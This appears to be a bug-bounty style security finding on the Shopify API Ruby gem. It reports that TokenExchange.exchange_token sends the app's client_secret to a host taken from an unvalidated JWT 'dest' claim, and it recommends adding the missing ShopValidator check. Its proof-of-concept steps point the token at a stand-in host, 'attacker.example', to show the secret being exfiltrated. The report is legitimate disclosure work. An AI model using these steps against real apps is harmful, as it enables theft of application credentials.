Found a concrete analog: in `TokenExchange.exchange_token` (`lib/shopify_api/auth/token_exchange.rb:29-65`), the shop used to build the request host (and thus the destination that receives the app's `client_secret`) is taken directly from the JWT's `dest` claim via `jwt_payload.shop` (`lib/shopify_api/auth/jwt_payload.rb:47-50`), with **no** call to `Utils::ShopValidator.sanitize!`. This is inconsistent with the sibling methods `migrate_to_expiring_token` (`token_exchange.rb:103`), `RefreshToken.refresh_access_token` (`lib/shopify_api/auth/refresh_token.rb:24`), and `ClientCredentials.client_credentials` (`lib/shopify_api/auth/client_credentials.rb:25`), which all explicitly sanitize the shop through `ShopValidator.sanitize!` before it is used to build the request host in `Clients::HttpClient#initialize` (`lib/shopify_api/clients/http_client.rb:18`, `@base_uri = "https://#{api_host || session.shop}"`).

### Title
SSRF-style credential leak: `client_secret` sent to unvalidated host derived from JWT `dest` claim in `TokenExchange.exchange_token` - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`TokenExchange.exchange_token` builds the OAuth token-exchange request host directly from the JWT payload's `dest` claim without passing it through `ShopValidator.sanitize!`, unlike every other credential-bearing flow in the gem.

### Finding Description
`exchange_token` decodes the caller-supplied `session_token` with `JwtPayload.new(session_token)` [1](#0-0) , and derives `dest_shop` from `jwt_payload.shop`, which is simply `@dest.gsub("https://", "")` with no host allow-list check [2](#0-1) . `JwtPayload#initialize` verifies the signature (`aud`, `exp`, `nbf` via `JWT.decode`) but never validates that `dest` is a genuine `myshopify.com`/trusted Shopify domain [3](#0-2) . That unvalidated `dest_shop` is used to build `shop_session`, which `Clients::HttpClient` turns directly into the request host: `@base_uri = "https://#{api_host || session.shop}"` [4](#0-3) . The POST body sent to that host includes `client_secret: ShopifyAPI::Context.api_secret_key` [5](#0-4) .

This breaks the intended binding: *host that receives the `client_secret` == a value validated as an actual Shopify domain*. Every sibling method that builds a similar `client_secret`-bearing request first calls `Utils::ShopValidator.sanitize!(shop)`: `migrate_to_expiring_token` [6](#0-5) , `RefreshToken.refresh_access_token` [7](#0-6) , and `ClientCredentials.client_credentials` [8](#0-7) . `ShopValidator.sanitize!` enforces the value resolves to a host under `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) [9](#0-8) , exactly the check `exchange_token` skips.

Because `JwtPayload` only checks the signature and `aud`, an attacker who can obtain *any* validly-signed session token for the app (e.g., from their own installed shop, or a token issued for a different, legitimate purpose) controls the `dest` claim's string value that ends up in `jwt_payload.shop`, and hence the destination host of the token-exchange POST request that carries the app's `client_secret`.

### Impact Explanation
If `dest` can be made to resolve to attacker infrastructure, `exchange_token` will POST the app's `client_id`, `client_secret`, and the `subject_token` (the session token itself) to that host — leaking the app's `client_secret` to a third party. Per the reward scope, SSRF that carries the app's credentials is a High-impact finding.

### Likelihood Explanation
Exploitability depends entirely on whether an attacker can produce a signed session token (or otherwise cause `JwtPayload.new` to accept one) whose `dest` claim is attacker-controlled and not itself constrained to `*.myshopify.com`/trusted domains at signing time by Shopify's own token issuance. This gem's code performs no independent verification of `dest`, so the security boundary here relies entirely on upstream (Shopify's session-token issuer) never emitting a `dest` outside the trusted domains — a property this library does not enforce despite enforcing it in three parallel code paths. I cannot verify from this repo alone whether Shopify's servers ever issue a token with an attacker-influenced `dest`; this is a defense-in-depth gap and an inconsistency in the library's own trust model rather than a confirmed end-to-end exploit chain purely within this codebase.

### Recommendation
Call `Utils::ShopValidator.sanitize!(dest_shop)` (or an equivalent check against `TRUSTED_SHOPIFY_DOMAINS`) on the `dest` claim inside `JwtPayload#shop`/`shopify_domain`, or explicitly in `TokenExchange.exchange_token` before constructing `shop_session`, matching the pattern already used in `migrate_to_expiring_token`, `refresh_access_token`, and `client_credentials`.

### Proof of Concept
1. Obtain (or forge, if `dest` is not constrained upstream) a session token signed with the app's `api_secret_key` whose `dest` claim is `"https://attacker.example"`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN)`.
3. `JwtPayload.new` accepts the token (signature/`aud`/`exp`/`nbf` all valid) and returns `dest_shop = "attacker.example"` [1](#0-0) .
4. `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")` builds `@base_uri_and_path = "https://attacker.example/admin/oauth"` [4](#0-3) .
5. The library POSTs `{client_id, client_secret, grant_type, subject_token, subject_token_type, requested_token_type}` to `https://attacker.example/admin/oauth/access_token`, exfiltrating the app's `client_secret` [10](#0-9) .
